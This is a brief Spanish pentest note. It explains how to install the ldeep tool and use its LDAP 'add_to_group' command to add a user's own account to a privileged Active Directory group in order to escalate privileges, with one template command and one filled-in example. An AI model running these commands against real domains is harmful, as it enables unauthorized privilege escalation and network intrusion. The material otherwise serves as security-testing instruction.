# Intro

En algunos casos podemos abusar de ldap para elevar nuestros privilegios. Para esto podemos usar ldeep

# instalación

### 1) Creamos un entorno virtual

    python -m venv ldeep

### 2) entramos al entorno virtual

    source ldeep/bin/activate

### 3) Instalamos ldeep

    python -m pip install ldeep

# Ejemplo de uso

### agregarnos a un grupo


    ldeep ldap -u <user> -p '<pass>' -d <domain> -s ldap://<domain> add_to_group "CN=<user>,OU=<grupo_al_que_pertenecemos>,DC=<dominio>,DC=<dominio(com,local)>" "CN=<grupo al que nos vamos a agregar>,OU=<ou del grupo>,DC=<domain>,DC=<dominio>


Ejemplo aplicado

    **ldeep ldap -u fulano -p 'mengano' -d dominio.local -s ldap://dominio.local add_to_group "CN=Fulano Flores,OU=STAFF,DC=dominio,DC=local" "CN=remote access,OU=remote,DC=dominio,DC=local"**
